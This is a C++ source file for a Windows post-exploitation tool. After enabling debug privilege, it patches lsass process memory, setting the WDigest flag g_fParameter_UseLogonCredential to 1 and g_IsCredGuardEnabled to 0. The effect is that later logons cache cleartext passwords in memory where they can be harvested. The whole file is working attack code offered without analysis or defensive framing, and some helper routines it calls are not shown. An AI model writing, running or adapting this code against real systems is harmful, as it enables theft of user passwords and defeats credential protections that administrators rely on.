// PatchWdigestMemory.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include "stdafx.h"

DWORD NT_MAJOR_VERSION, NT_MINOR_VERSION, NT_BUILD_NUMBER;

BOOL PatchMemory()
{
	BOOL status = FALSE;
	DWORD dwCurrent;
	DWORD UseLogonCredential = 1;
	DWORD IsCredGuardEnabled = 0;

	status = AcquireLSA();
	if (status)
	{
		if (ReadProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, &dwCurrent, sizeof(DWORD), NULL))
		{
			wprintf(L"[*] The current value of g_fParameter_UseLogonCredential is %d\n", dwCurrent);
			if (WriteProcessMemory(cLsass.hProcess, g_fParameter_UseLogonCredential, (PVOID)&UseLogonCredential, sizeof(DWORD), NULL))
			{
				wprintf(L"[*] Patched value of g_fParameter_UseLogonCredential to 1\n");
				status = TRUE;
			}
			else
				wprintf(L"[-] Failed to WriteProcessMemory for g_fParameter_UseLogonCredential.\n");
		}
		else
			wprintf(L"[-] Failed to ReadProcessMemory for g_fParameter_UseLogonCredential\n");


		if (ReadProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, &dwCurrent, sizeof(DWORD), NULL))
		{
			wprintf(L"[*] The current value of g_IsCredGuardEnabled is %d\n", dwCurrent);
			if (WriteProcessMemory(cLsass.hProcess, g_IsCredGuardEnabled, (PVOID)&IsCredGuardEnabled, sizeof(DWORD), NULL))
			{
				wprintf(L"[*] Patched value of g_IsCredGuardEnabled to 0\n");
				status = TRUE;
			}
			else
				wprintf(L"[-] Failed to WriteProcessMemory for g_IsCredGuardEnabled.\n");
		}
		else
			wprintf(L"[-] Failed to ReadProcessMemory for g_IsCredGuardEnabled\n");
	}
	return status;
}


int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;

	RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
	// Open a process token and get a process token handle with TOKEN_ADJUST_PRIVILEGES permission
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error [%u].\n", GetLastError());
		return -1;
	}

	if (EnableDebugPrivilege(hToken, SE_DEBUG_NAME))
	{
		PatchMemory();
	}
}
